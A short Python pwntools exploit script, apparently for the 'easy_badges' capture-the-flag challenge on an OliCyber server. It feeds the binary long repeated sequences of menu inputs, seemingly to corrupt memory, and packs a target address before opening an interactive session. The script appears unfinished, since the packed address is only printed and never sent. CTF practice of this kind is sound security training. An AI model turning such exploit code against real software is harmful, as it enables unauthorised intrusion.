from pwn import *

elf = context.binary = ELF('./easy_badges')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("easybadges.challs.nazionale.olicyber.it", 31500)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b preview_badge
    c      
    ''')
else:
    conn = elf.process()
conn.recvuntil(b"> :")
conn.sendline(b"4")
conn.sendline(b"1")
for i in range(64):
    conn.sendline(b"1")
    conn.sendline(b"1")
    conn.sendline(b"4")
    conn.sendline(b"256")

for i in range(13):
    conn.sendline(b"1")
    conn.sendline(b"1")
    conn.sendline(b"4")
    conn.sendline(b"256")

    
for i in range(3):
    conn.sendline(b"1")
    conn.sendline(b"1")
    conn.sendline(b"4")
    conn.sendline(b"255")

for i in range(8):
    conn.sendline(b"1")
    conn.sendline(b"1")
    conn.sendline(b"4")
    conn.sendline(b"256")



conn.sendline(b"1")
conn.sendline(b"1")
conn.sendline(b"4")
conn.sendline(b"64")

conn.sendline(b"1")
conn.sendline(b"1")
conn.sendline(b"4")
conn.sendline(b"64")


data_address = p64(0x404001) #b'\x01@@\x00\x00\x00\x00\x00'
print(data_address)
conn.interactive()
